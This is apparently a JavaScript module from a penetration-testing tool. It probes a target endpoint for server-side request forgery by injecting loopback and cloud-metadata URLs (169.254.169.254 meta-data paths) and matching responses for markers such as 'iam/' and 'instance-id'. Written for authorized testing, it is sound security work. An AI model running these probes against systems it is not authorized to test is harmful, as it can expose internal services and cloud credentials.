// VARVEL — SSRF probe pack (authorized engagements).
//
// The SSRF slot RedAmon's kali_shell fills with ad-hoc curl. Native, honest, and quiet:
// given an endpoint that takes a URL-ish parameter, this pack probes whether the SERVER
// will fetch attacker-chosen locations. Standard, well-known probe VALUES (loopback,
// cloud metadata, internal hosts) — the same ones every SSRF methodology uses — fired
// from a tiny curated set, never a fuzzing storm.
//
// HONESTY CONTRACT: an SSRF is only reported on EVIDENCE — the response to a probe
// differs from the baseline in a way consistent with a server-side fetch (content
// markers like metadata keys or localhost banners, or a strong status/size differential
// against BOTH the baseline and an invalid-host control). "Maybe" is not reported.
//
// Governance: the INJECTION POINT is same-origin enforced (the param lives on the
// authorized target); the probe values are the standard internal set. Budget-capped,
// stealth-pacer honored, adaptive back-off on 429/503.

import http from 'node:http';
import https from 'node:https';
import { makePacer, asPacer } from '../engine/stealth.mjs';

const BODY_CAP = 128 * 1024;

// The standard SSRF probe values, each with its content evidence markers.
export const PROBE_VALUES = [
  { value: 'http://127.0.0.1/', label: 'loopback', markers: [/localhost|127\.0\.0\.1/i] },
  { value: 'http://169.254.169.254/latest/meta-data/', label: 'cloud-metadata (AWS-style)', markers: [/ami-id|instance-id|local-hostname|iam\//i] },
  { value: 'http://169.254.169.254/metadata/v1/', label: 'cloud-metadata (GCP-style)', markers: [/instance\/|project\//i] },
  { value: 'http://[::1]/', label: 'ipv6 loopback', markers: [/localhost|::1/i] },
  { value: 'http://localhost/', label: 'named loopback', markers: [/localhost/i] },
];
// A control that must NOT succeed: an unroutable host. If the control looks the same as
// the probes, the "differential" is meaningless and nothing is reported.
const CONTROL_VALUE = 'http://nonexistent.invalid/';

function raw(u, { timeout = 2000, agents } = {}) {
  return new Promise((resolve) => {
    const lib = u.protocol === 'https:' ? https : http;
    let text = '', settled = false;
    const done = (v) => { if (settled) return; settled = true; clearTimeout(deadline); resolve(v); };
    const req = lib.request({
      hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname + u.search, method: 'GET', timeout, rejectUnauthorized: false,
      agent: agents ? (u.protocol === 'https:' ? agents.httpsAgent : agents.httpAgent) : undefined,
      headers: { 'user-agent': 'VARVEL-ssrfprobe', accept: '*/*' },
    }, (r) => {
      r.on('data', (d) => {
        if (settled) return;
        if (text.length < BODY_CAP) text += d.toString('utf8', 0, Math.max(0, BODY_CAP - text.length));
        if (text.length >= BODY_CAP) { done({ status: r.statusCode, body: text }); try { req.destroy(); } catch {} }
      });
      r.on('end', () => done({ status: r.statusCode, body: text }));
    });
    const deadline = setTimeout(() => { try { req.destroy(); } catch {} done(null); }, Math.max(timeout * 3, 4000));
    req.on('timeout', () => { try { req.destroy(); } catch {} done(null); });
    req.on('error', () => done(null));
    req.end();
  });
}

const sig = (r) => (r ? { status: r.status, len: r.body.length, head: r.body.slice(0, 300) } : null);

// endpoint: full URL of the injection point, with the literal token {URL} where the
// probe value goes — e.g. 'http://target/fetch?u={URL}' or '…/proxy?target={URL}'.
export async function ssrfProbe(endpoint, { timeout = 2000, maxProbes = 8, stealth, pacer, markers: extraMarkers = [], agents = null } = {}) {
  if (!/\{URL\}/.test(String(endpoint || ''))) throw new TypeError('ssrfProbe: endpoint must contain the {URL} placeholder');
  let origin;
  try { origin = new URL(String(endpoint).replace('{URL}', 'x')).origin; } catch { throw new TypeError('ssrfProbe: bad endpoint URL'); }

  pacer = asPacer(pacer) || (stealth ? makePacer(stealth) : null);
  const budget = Math.max(3, Math.floor(maxProbes) || 8);
  let used = 0;
  const fire = async (value) => {
    if (used >= budget) return null;
    let u;
    try { u = new URL(String(endpoint).replace('{URL}', encodeURIComponent(value))); } catch { return null; }
    if (u.origin !== origin) return null; // injection point is always same-origin
    used++;
    if (pacer) await pacer.pace();
    const r = await raw(u, { timeout, agents });
    if (pacer && r && (r.status === 429 || r.status === 503)) pacer.penalize(2, 0);
    return r;
  };

  // Baseline (param absent-ish) + control (unroutable) — the two comparisons that keep
  // this honest.
  const baseline = sig(await fire(''));
  const control = sig(await fire(CONTROL_VALUE));

  const findings = [];
  for (const probe of PROBE_VALUES) {
    if (used >= budget) break;
    const r = await fire(probe.value);
    if (!r) continue;
    const s = sig(r);
    // EVIDENCE 1: a known content marker of the probed destination
    const markerHit = [...probe.markers, ...extraMarkers].find((re) => re.test(r.body));
    // EVIDENCE 2: a strong differential vs baseline AND control (not just "an error")
    const differs = baseline && control
      && (s.status !== control.status || Math.abs(s.len - control.len) > Math.max(200, control.len * 0.3))
      && (s.status !== baseline.status || Math.abs(s.len - baseline.len) > Math.max(200, baseline.len * 0.3));
    if (!markerHit && !differs) continue;
    findings.push({
      probe: probe.label, value: probe.value,
      evidence: markerHit ? 'content marker: ' + String(markerHit).slice(0, 60) : `differential: probe ${s.status}/${s.len}b vs control ${control.status}/${control.len}b vs baseline ${baseline.status}/${baseline.len}b`,
      confidence: markerHit ? 'confirmed' : 'firm',
    });
  }

  return {
    endpoint: origin + new URL(String(endpoint).replace('{URL}', 'x')).pathname,
    vulnerable: findings.length > 0,
    findings,
    baseline, control,
    requests: used,
    stealth: pacer ? pacer.profile.label : null,
  };
}
